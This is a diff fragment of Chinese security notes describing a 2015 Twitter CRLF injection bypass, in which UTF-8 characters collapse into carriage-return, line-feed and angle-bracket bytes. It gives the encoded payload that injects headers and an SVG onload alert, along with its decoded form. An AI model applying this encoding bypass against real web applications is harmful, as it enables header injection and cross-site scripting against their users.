@@ -1,0 +1,5 @@
+验证是否提交了禁止的字符，之后如果提交的数据是UTF-8编码过的，则会将其转为原始的unicode码后去掉一些无用字符后再取剩下的字节(Twitter-2015年):
+%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
+
+content-type:text/html（CRLF）
+location:<svg/onload=alert(innerHTML)>
